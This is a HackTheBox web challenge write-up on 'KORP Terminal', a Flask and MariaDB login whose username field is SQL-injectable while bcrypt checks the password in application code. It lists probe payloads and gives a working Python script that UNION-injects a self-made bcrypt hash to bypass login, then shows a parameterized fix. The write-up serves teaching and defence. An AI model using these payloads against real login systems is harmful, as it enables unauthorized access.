---
title: "KORP Terminal"
date: 2026-10-13 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, sqli, union, bcrypt, auth-bypass, mariadb]
description: "A Very Easy Web challenge: a Flask + MariaDB login is SQL-injectable, but the password is verified app-side with bcrypt.checkpw, so the usual comment-out bypass fails. The intended path is to UNION-inject a bcrypt hash you generated yourself, then log in with the matching password."
---

## Overview

`KORP Terminal` is a Very Easy HackTheBox **Web** challenge: a single login form backed
by Flask and MariaDB. The username field is vulnerable to
[SQL injection](https://cwe.mitre.org/data/definitions/89.html), but there is a twist —
the password is not checked inside the SQL query, it is verified in Python with
`bcrypt.checkpw`. That one design choice breaks the classic "comment out the password
check" trick, and the intended solution is to **UNION-inject a bcrypt hash you generated
yourself** and then log in with the password that matches it.

## The technique

The backend login is essentially this:

```python
# username concatenated straight into SQL; password verified app-side
row = db.execute("SELECT password FROM users WHERE username='%s'" % user).fetchone()
if row and bcrypt.checkpw(pw.encode(), row[0].encode()):
    return flag
return 401
```

Two facts decide the whole challenge:

1. The query returns a **single column** — only the stored password hash.
2. The password is compared **outside SQL** by `bcrypt.checkpw`, so there is no
   `AND password='...'` clause to comment out. A tautology like `' OR 1=1-- -` returns a
   real row, but `checkpw('x', real_victim_hash)` still fails → 401.

Because the comparison left SQL and moved into application code, we don't defeat a SQL
password check (there isn't one) — we feed the app-side verifier a value it will accept.
We `UNION SELECT` a bcrypt hash **we** computed for a password **we** know, then submit
that password.

## Solution

Every probe is a single `curl --max-time` POST, and the error bodies hand us the design:

| Payload (`username=`) | Response | What it proves |
|---|---|---|
| `admin'` | 500 `1064 ... MariaDB` | string SQLi, DBMS = MariaDB |
| `zzz' UNION SELECT NULL-- -` | 500 `'NoneType' object has no attribute 'encode'` | exactly **1 column**, value fed to a hash routine |
| `zzz' UNION SELECT 'admin'-- -` (and md5/sha256) | 500 `ValueError: Invalid salt` | the verifier is **bcrypt** |

The `Invalid salt` error is the giveaway: `bcrypt.checkpw` raises exactly that when the
"stored hash" isn't a valid bcrypt string. So we hand it a valid one.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, requests, bcrypt

T = sys.argv[1]                                   # http://host:port
pw = b"admin"
h = bcrypt.hashpw(pw, bcrypt.gensalt()).decode()  # valid bcrypt of "admin"
payload = f"zzz' UNION SELECT '{h}'-- -"          # 1-column UNION, our hash wins
r = requests.post(T + "/", data={"username": payload, "password": pw.decode()}, timeout=10)
print(r.status_code, r.text.strip())
```

`username=zzz` matches no real user, so the UNION supplies the only row — **our** hash.
The app then runs `checkpw('admin', our_hash)` → `True` and returns the flag:

```bash
python3 solve.py http://<target>:<port>
# 200 HTB{...}
```

## Why it worked

The developer moved the password comparison out of SQL into bcrypt (a reasonable instinct)
but left the username concatenated into the query. SQL injection then lets us control the
exact column the verifier reads, so we inject an input the verifier is guaranteed to
accept. This generalizes to any app-side verifier — argon2, passlib, `hmac.compare_digest`
— wherever a UNION-controllable value reaches the check.

## Fix / defense

```python
# parameterized query — the username can no longer alter the SQL
row = db.execute("SELECT id,password FROM users WHERE username=%s", (user,)).fetchone()
if row and bcrypt.checkpw(pw.encode(), row[1].encode()):
    login_ok(row[0])
```

- **Parameterize** the query so the username is data, never SQL — with no injection the
  attacker cannot substitute the hash.
- **Don't leak DB / stack-trace errors** — the `1064` and `Invalid salt` messages gave away
  the column count and the hash scheme for free.
- Bind the authenticated identity to the row's real `id`, and trust the result only if
  exactly one genuine row matched.
